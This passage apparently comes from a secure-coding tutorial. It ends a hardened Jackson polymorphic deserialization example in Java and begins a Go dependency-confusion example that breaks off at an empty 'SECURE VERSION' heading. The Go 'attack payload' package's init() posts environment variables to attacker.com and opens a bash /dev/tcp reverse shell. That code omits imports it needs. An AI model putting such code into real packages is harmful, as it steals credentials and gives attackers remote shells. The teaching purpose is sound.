**Key Security Controls**:
- **Use specific types**: Always deserialize to concrete DTOs, never `Object.class`
- **Avoid enableDefaultTyping()**: This is the root cause of most Jackson RCE vulnerabilities
- **Use PolymorphicTypeValidator**: If polymorphism is needed, strictly whitelist allowed types
- **Keep Jackson updated**: Regularly update to latest version with security patches

When you genuinely need polymorphic deserialization, you must implement strict controls. Here's a production-safe approach that handles multiple message types securely.

**PRODUCTION PATTERN**:

```java
import com.fasterxml.jackson.annotation.JsonSubTypes;
import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.json.JsonMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

// SECURE: Closed type hierarchy with explicit subtypes
@JsonTypeInfo(
    use = JsonTypeInfo.Id.NAME,
    include = JsonTypeInfo.As.PROPERTY,
    property = "messageType",
    visible = true
)
@JsonSubTypes({
    @JsonSubTypes.Type(value = OrderMessage.class, name = "ORDER"),
    @JsonSubTypes.Type(value = PaymentMessage.class, name = "PAYMENT"),
    @JsonSubTypes.Type(value = NotificationMessage.class, name = "NOTIFICATION")
})
public abstract class BaseMessage {
    private String messageId;
    private String messageType;
    private long timestamp;

    public abstract void validate();

    public String getMessageId() { return messageId; }
    public void setMessageId(String messageId) { this.messageId = messageId; }
    public String getMessageType() { return messageType; }
    public void setMessageType(String messageType) { this.messageType = messageType; }
    public long getTimestamp() { return timestamp; }
    public void setTimestamp(long timestamp) { this.timestamp = timestamp; }
}

public class OrderMessage extends BaseMessage {
    private String orderId;
    private String customerId;
    private double amount;

    @Override
    public void validate() {
        if (orderId == null || !orderId.matches("^ORD-[A-Z0-9]{10}$")) {
            throw new IllegalArgumentException("Invalid order ID format");
        }
        if (amount < 0 || amount > 1000000) {
            throw new IllegalArgumentException("Invalid amount");
        }
    }

    // Getters and setters
    public String getOrderId() { return orderId; }
    public void setOrderId(String orderId) { this.orderId = orderId; }
    public String getCustomerId() { return customerId; }
    public void setCustomerId(String customerId) { this.customerId = customerId; }
    public double getAmount() { return amount; }
    public void setAmount(double amount) { this.amount = amount; }
}

public class PaymentMessage extends BaseMessage {
    private String paymentId;
    private String orderId;
    private String status;

    private static final Set<String> VALID_STATUSES = Set.of(
        "PENDING", "COMPLETED", "FAILED", "REFUNDED"
    );

    @Override
    public void validate() {
        if (!VALID_STATUSES.contains(status)) {
            throw new IllegalArgumentException("Invalid payment status");
        }
    }

    // Getters and setters
    public String getPaymentId() { return paymentId; }
    public void setPaymentId(String paymentId) { this.paymentId = paymentId; }
    public String getOrderId() { return orderId; }
    public void setOrderId(String orderId) { this.orderId = orderId; }
    public String getStatus() { return status; }
    public void setStatus(String status) { this.status = status; }
}

public class NotificationMessage extends BaseMessage {
    private String recipient;
    private String subject;
    private String body;

    @Override
    public void validate() {
        if (body != null && body.length() > 10000) {
            throw new IllegalArgumentException("Message body too long");
        }
    }

    // Getters and setters
    public String getRecipient() { return recipient; }
    public void setRecipient(String recipient) { this.recipient = recipient; }
    public String getSubject() { return subject; }
    public void setSubject(String subject) { this.subject = subject; }
    public String getBody() { return body; }
    public void setBody(String body) { this.body = body; }
}

@Service
public class SecureMessageProcessor {

    private static final Logger logger = LoggerFactory.getLogger(SecureMessageProcessor.class);
    private static final Logger securityLogger = LoggerFactory.getLogger("SECURITY_AUDIT");

    private final ObjectMapper secureMapper;
    private final Map<String, Integer> typeCounters = new ConcurrentHashMap<>();

    // Whitelist of allowed message types
    private static final Set<String> ALLOWED_TYPES = Set.of(
        "ORDER", "PAYMENT", "NOTIFICATION"
    );

    private static final int MAX_PAYLOAD_SIZE = 1024 * 1024; // 1MB

    public SecureMessageProcessor() {
        // DEFENSE LAYER 1: Strict polymorphic type validator
        BasicPolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
            .allowIfBaseType(BaseMessage.class)
            .allowIfSubType(OrderMessage.class)
            .allowIfSubType(PaymentMessage.class)
            .allowIfSubType(NotificationMessage.class)
            .denyForExactBaseType(Object.class)
            .build();

        this.secureMapper = JsonMapper.builder()
            .activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL)
            .build();

        // Disable dangerous features
        this.secureMapper.getFactory().disable(
            com.fasterxml.jackson.core.JsonParser.Feature.AUTO_CLOSE_SOURCE
        );
    }

    public BaseMessage processMessage(String jsonPayload, String sourceIp) {
        // DEFENSE LAYER 2: Size limit check
        if (jsonPayload == null || jsonPayload.length() > MAX_PAYLOAD_SIZE) {
            securityLogger.warn("Oversized payload rejected from IP: {}", sourceIp);
            throw new SecurityException("Payload size exceeds limit");
        }

        // DEFENSE LAYER 3: Pre-parse type validation
        String declaredType = extractMessageType(jsonPayload);
        if (declaredType == null || !ALLOWED_TYPES.contains(declaredType)) {
            securityLogger.warn(
                "Invalid message type '{}' from IP: {}", 
                declaredType, sourceIp
            );
            throw new SecurityException("Invalid message type");
        }

        try {
            // DEFENSE LAYER 4: Deserialize to closed type hierarchy
            BaseMessage message = secureMapper.readValue(jsonPayload, BaseMessage.class);

            // DEFENSE LAYER 5: Post-deserialization validation
            message.validate();

            // Audit logging
            logger.info(
                "Processed {} message ID: {} from IP: {}",
                message.getMessageType(),
                message.getMessageId(),
                sourceIp
            );

            // Track message type distribution for anomaly detection
            trackMessageType(message.getMessageType());

            return message;

        } catch (SecurityException e) {
            throw e;
        } catch (Exception e) {
            securityLogger.error(
                "Deserialization failed for payload from IP: {} - {}",
                sourceIp, e.getClass().getSimpleName()
            );
            throw new SecurityException("Invalid message format");
        }
    }

    private String extractMessageType(String json) {
        // Simple extraction without full parsing - defense in depth
        try {
            int typeIndex = json.indexOf("\"messageType\"");
            if (typeIndex == -1) return null;

            int colonIndex = json.indexOf(':', typeIndex);
            int quoteStart = json.indexOf('"', colonIndex);
            int quoteEnd = json.indexOf('"', quoteStart + 1);

            if (quoteStart == -1 || quoteEnd == -1) return null;

            return json.substring(quoteStart + 1, quoteEnd);
        } catch (Exception e) {
            return null;
        }
    }

    private void trackMessageType(String type) {
        typeCounters.merge(type, 1, Integer::sum);

        // Alert on unusual patterns (simplified anomaly detection)
        int count = typeCounters.get(type);
        if (count % 1000 == 0) {
            logger.info("Message type {} count reached: {}", type, count);
        }
    }
}
```

**Defense in Depth Layers**:

1. **Closed Type Hierarchy**: Using `@JsonSubTypes` explicitly lists allowed types - no arbitrary class loading
```java
@JsonSubTypes({
    @JsonSubTypes.Type(value = OrderMessage.class, name = "ORDER"),
    // Only these types can be instantiated
})
```

2. **BasicPolymorphicTypeValidator**: Whitelist validation at Jackson level
```java
BasicPolymorphicTypeValidator.builder()
    .allowIfBaseType(BaseMessage.class)
    .denyForExactBaseType(Object.class)
    .build();
```

3. **Pre-parse Type Checking**: Validate type before Jackson processes
```java
String declaredType = extractMessageType(jsonPayload);
if (!ALLOWED_TYPES.contains(declaredType)) {
    throw new SecurityException("Invalid message type");
}
```

4. **Post-deserialization Validation**: Each message type validates its own data
```java
message.validate(); // Business logic validation
```

**Additional Protections**:
- **Keep Jackson-databind updated**: Check for CVEs regularly, current safe version is 2.15.x+
- **Use dependency scanning**: Integrate OWASP Dependency-Check or Snyk in CI/CD
- **Monitor deserialization errors**: Spike in failures may indicate attack probing
- **Network segmentation**: Limit outbound connections to prevent JNDI/RMI callbacks
- **Use Java Security Manager**: Block dangerous operations at JVM level (deprecated but still useful)
- **Consider alternatives**: For untrusted input, consider safer formats like Protocol Buffers or flat JSON without type information

Go dependency management requires careful attention to prevent supply chain attacks, including dependency confusion and typosquatting. The 2021 dependency confusion attacks affected 35+ major companies including Microsoft, Apple, and PayPal by exploiting package resolution order between public and private registries.

**VULNERABLE CODE**:

```go
package main

import (
	"fmt"
	"log"

	// Vulnerable: Internal package name that could be hijacked on public registry
	"company-internal-utils/auth"

	// Vulnerable: No version pinning, always fetches latest
	"github.com/someuser/jwt-helper"

	// Vulnerable: Typosquatting risk - easily mistyped package names
	"github.com/gorila/mux" // Note: typo - real package is "gorilla/mux"
)

func main() {
	// Using potentially compromised dependencies
	token := jwt.GenerateToken("user123")
	fmt.Println(auth.ValidateUser(token))
}
```

**go.mod (Vulnerable)**:
```
module mycompany/myapp

go 1.21

// No version pinning - vulnerable to malicious updates
require (
	company-internal-utils/auth latest
	github.com/someuser/jwt-helper v0.0.0
	github.com/gorila/mux v1.8.0
)

// No checksum verification configured
// No private registry exclusions
```

**Attack Payload - Malicious Package (published to public registry)**:
```go
package auth

import (
	"net/http"
	"os"
	"os/exec"
)

func init() {
	// Executes during import - before main()
	go exfiltrateSecrets()
}

func exfiltrateSecrets() {
	// Steal environment variables (AWS keys, DB creds, etc.)
	envData := os.Environ()
	http.Post("https://attacker.com/collect", 
		"application/json", 
		bytes.NewBuffer([]byte(strings.Join(envData, "\n"))))

	// Establish reverse shell
	exec.Command("/bin/bash", "-c", 
		"bash -i >& /dev/tcp/attacker.com/4444 0>&1").Run()
}

// Legitimate-looking function to avoid suspicion
func ValidateUser(token string) bool {
	return len(token) > 0
}
```

**Why This Is Dangerous**:
- Internal package names without proper scoping can be hijacked on public registries
- Missing version pins allow attackers to publish newer malicious versions
- No checksum verification means modified packages go undetected
- `init()` functions execute automatically during import, enabling immediate code execution
- Build systems and CI/CD pipelines often have elevated privileges and access to secrets

**SECURE VERSION**:

